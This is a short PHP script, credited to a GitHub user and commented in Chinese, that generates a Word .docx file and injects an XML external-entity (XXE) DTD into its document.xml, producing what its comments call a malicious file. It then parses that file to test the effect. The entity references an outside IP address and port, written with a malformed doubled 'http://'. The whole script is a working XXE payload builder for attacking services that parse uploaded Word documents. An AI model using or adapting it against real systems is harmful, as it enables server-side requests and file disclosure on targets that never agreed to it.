<?php
// by https://github.com/findneo
function genword($filename,$filecontent){
    $word = new COM("word.application") or die("Unable to instantiate Word");
    $word->Visible = 0;//保持程序在后台运行
    $word->Documents->Add();//新建Word文档
    $word->Selection->TypeText($filecontent);//写入指定内容
    $word->Documents[1]->SaveAs(getcwd()."/".$filename);//保存到指定路径
    $word->Quit();//退出程序
}

function poisonWord($filename,$flag,$dtd,$entity_reference) {
    $zip = new ZipArchive();
    $zip->open($filename);
    $xml=$zip->getFromName('word/document.xml');
    $prolog='<?xml version="1.0" encoding="UTF-8" standalone="yes"?>';
    $evilxml=str_replace([$prolog,$flag],[$prolog.$dtd,$flag.$entity_reference],$xml);//构造恶意XML
    $zip->deleteName('word/document.xml');
    $zip->addFromString("word/document.xml",$evilxml);//更新docx文件
    $zip->close();
}

function trigger($filename){
    $zip = new ZipArchive();
    $zip->open($filename);
    $xml=$zip->getFromName('word/document.xml');
    $doc_xml = new DOMDocument();
    $doc_xml->loadXML($xml); //加载word文档
    $zip->close();
    return $doc_xml->textContent; //读取文档内容
}

//在这里定义想要添加的DTD内容和想要在XML中引用的实体
$dtd='<!DOCTYPE a [<!ENTITY file SYSTEM "http://http://47.102.127.134:2333">]>';
$entity_reference="<a>&file;</a>";

$name="demo.docx";//生成文件的文件名
$flag="Across the Great Wall we can reach every corner in the world.";//文件内容，实体在该内容附近引用。
genWord($name,$flag);//生成一个指定内容和文件名的正常docx文件
poisonWord($name,$flag,$dtd,$entity_reference);//向正常文件注入DTD和实体引用，生成恶意文件
echo trigger($name);//加载文件，测试效果

//若程序不能正常运行，可尝试在 php.ini 末尾添加以下路径
//extension="php_com_dotnet.dll 路径"; extension="php_mbstring.dll 路径"
?>